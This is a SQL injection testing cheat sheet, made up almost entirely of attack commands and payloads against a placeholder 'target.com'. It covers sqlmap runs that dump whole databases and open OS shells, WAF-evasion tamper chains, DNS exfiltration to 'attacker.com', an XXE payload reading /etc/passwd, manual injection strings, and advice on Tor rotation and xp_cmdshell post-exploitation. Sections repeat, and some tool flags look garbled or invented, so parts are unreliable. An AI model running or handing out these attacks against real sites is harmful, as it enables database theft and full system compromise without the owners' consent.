### 3.3 SQL Injection Testing
    ### 3.3 SQL Injection Testing
    # 1. SQLMAP (Automated SQLi Detection)
    # Basic GET parameter testing
    sqlmap -u "https://target.com/search?id=FUZZ" \
    --batch \
    --random-agent \
    --output-dir=sqlmap_results \
    --level=3 \
    --risk=3

    # Comprehensive scan with WAF bypass
    sqlmap -u "https://target.com/login" \
    --data="username=admin&password=pass" \
    --tamper=space2comment,charencode \
    --dbms=mysql \
    --os-shell \
    --technique=BEUSTQ \
    --flush-session

    # 2. NOSQLMAP (NoSQL Injection)
    # MongoDB injection testing
    nosqlmap -u "https://target.com/api/user" \
    --method=POST \
    --data='{"username":"admin", "password":{"$ne":""}}' \
    --headers="Content-Type: application/json"

    # 3. BBQSQL (Blind SQLi Tool)
    # Time-based blind SQLi
    bbqsql -u "https://target.com/profile?id=1*" \
    --method=GET \
    --data="" \
    --technique=time \
    --threads=5 \
    --cookie="session=123"

    # 4. JSQL (Java-based Scanner)
    # Fast parameter testing
    java -jar jsql-injection.jar -u "https://target.com/news?article=FUZZ"

    # 5. ADVANCED TECHNIQUES
    # Second-order SQLi
    sqlmap -r search_request.txt \
    --second-url="https://target.com/dashboard" \
    --dump-all

    # Header injection
    sqlmap -u "https://target.com/" \
    --headers="X-Forwarded-For: 127.0.0.1*" \
    --prefix="'" \
    --suffix="-- -"

    # ======================
    # PRO TIPS:
    # 1. Always test:
    #  - GET/POST parameters
    #  - HTTP headers
    #  - JSON/XML inputs
    #  - File upload fields
    #  - Hidden form fields
    # 2. Test different techniques:
    #  - Boolean-based blind
    #  - Time-based blind
    #  - Error-based
    #  - UNION queries
    #  - Stacked queries
    # 3. Use WAF bypass techniques:
    #  - Encoding
    #  - Comment obfuscation
    #  - Parameter fragmentation
    # 4. Test for NoSQL injections
    # 5. Monitor response times/differences

    # EXAMPLE WORKFLOW:
    # 1. Discover parameters with Burp/Arjun
    # 2. Test for basic injections with manual payloads
    # 3. Run sqlmap with --technique=B for blind cases
    # 4. Attempt UNION attacks if errors visible
    # 5. Escalate to OS access if possible

    # RECOMMENDED PAYLOADS:
    #  - /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
    #  - /usr/share/sqlmap/txt/common-outputs.txt
    #  - /usr/share/seclists/Fuzzing/Databases/NoSQL.txt
    #  - Custom DB-specific payloads

    # SAMPLE SQLi TESTING SCRIPT:
    """
    #!/bin/bash
    # sqli_tester.sh
    url=$1
    params_file=$2

    echo "SQLi Testing Report - $(date)"
    echo "============================"

    while read param; do
        # Test for basic injection
        echo -n "Testing $param: "
        response=$(curl -s "https://$url?$param='")
        if [[ $response =~ "SQL syntax" ]]; then
            echo "VULNERABLE (Error-based)"
        elif [[ $(curl -s "https://$url?$param=1 AND SLEEP(5)" -w "%{time_total}") > 5 ]]; then
            echo "VULNERABLE (Time-based)"
        else
            echo "No immediate injection detected"
        fi
    done < $params_file
    """

    # 6. SPECIALIZED TESTING
    # Out-of-band exfiltration
    sqlmap -u "https://target.com/search?q=test" \
    --dns-domain=attacker.com \
    --technique=O

    # Boolean-based blind
    sqlmap -u "https://target.com/profile?id=1" \
    --technique=B \
    --string="Welcome back"

    # XML injection
    curl -X POST "https://target.com/xmlapi" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><search>&xxe;</search>'

    # Advanced Techniques:
    # - Test with different content types
    # - Try DB-specific functions
    # - Test for SSRF via SQLi
    # - Check for XPath injections
    # - Test stored procedures

    # Security Considerations:
    # - SQLi may lead to:
    # - Database dumping
    # - Authentication bypass
    # - Remote code execution
    # - Sensitive data exposure
    # - Complete system compromise

    
    #### PRO TIPS:
    # 1. Always test:
    #  - Numeric vs string parameters
    #  - Different HTTP methods (GET/POST)
    #  - All API endpoints
    #  - File upload fields

    # 2. For stubborn targets:
    #  - Rotate user agents
    #  - Use Tor/proxy rotation
    #  - Try different tamper scripts
    #  - Adjust time delays

    # 3. Post-exploitation:
    #  - Check for DBA privileges
    #  - Look for xp_cmdshell
    #  - Test for file read/write
    #  - Attempt privilege escalation


    ### 3.3 SQL Injection Testing Cheat Sheet

    #### 1. BASIC DETECTION
    # Quick vulnerability check
    sqlmap -u "https://target.com?id=1" --batch

    # Standard database enumeration
    sqlmap -u "https://target.com?id=1" --batch --level=5 --risk=3 --dbs

    # Load from Burp request file
    sqlmap -r request.txt --dbs

    #### 2. ADVANCED ENUMERATION
    # With performance optimizations
    sqlmap -u "https://target.com/news.php?id=1" \
    --dbs \
    --threads=15 \
    --tamper="apostrophemask,apostrophenullencode,charencode,randomcase,unionallcols,unmagicquotes"

    # Time-based techniques (evasive)
    sqlmap -u "https://target.com/profile?id=1" \
    --time-sec=10 \
    --tamper="base64encode,htmlencode,urlencode" \
    --technique=T

    #### 3. DATA EXTRACTION
    # Dump specific table
    sqlmap -u "https://target.com/user?id=1" \
    -D webapp \
    -T users \
    --dump

    # OS command execution
    sqlmap -u "https://target.com/vuln.php?id=1" \
    --os-shell \
    --technique=E

    #### 4. ALTERNATIVE TOOLS
    # Modern SQLi scanner (Ghauri)
    ghauri --url "https://target.com/search.php?q=1" \
    --dbs \
    --threads=7 \
    --tamper="space2comment" \
    --skip-waf

    # NoSQL injection testing
    nosqlmap -u "https://target.com/api?query=admin" \
    --mongo-shell \
    --os-shell \
    --tamper="modunion"

    #### 5. SPECIALIZED TECHNIQUES
    # Second-order injection
    sqlmap -r search_request.txt \
    --second-url="https://target.com/dashboard" \
    --dump-all

    # Out-of-band exfiltration
    sqlmap -u "https://target.com/search?q=test" \
    --dns-domain=attacker.com \
    --technique=O

    # JSON injection
    sqlmap -u "https://api.target.com/data" \
    --data='{"id":1}' \
    --headers="Content-Type: application/json" \
    --prefix="'" \
    --suffix="-- -"

    #### 6. MANUAL TESTING PAYLOADS
    # Boolean-based blind
    ' OR 1=1 -- 

    # Time-based
    ' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES) > 0 AND SLEEP(5) -- 

    # NoSQL injection
    {"$where": "sleep(5000)"}

    # Error-based
    ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT USER()),0x7e),0) -- 

    #### 7. AUTOMATION SCRIPTS
    #!/bin/bash
    # Automated SQLi testing
    URLS=$1
    THREADS=5

    while read url; do
    sqlmap -u "$url" --batch --crawl=1 --threads=$THREADS --output-dir=reports/ &
    done < $URLS
    wait

    #### 8. WAF BYPASS TECHNIQUES
    # Chunked transfer encoding
    sqlmap -u "https://target.com" --chunked

    # Alternative comment syntax
    '/**/OR/**/1=1--

    # IP rotation
    sqlmap -u "https://target.com" --proxy="http://proxy.txt"
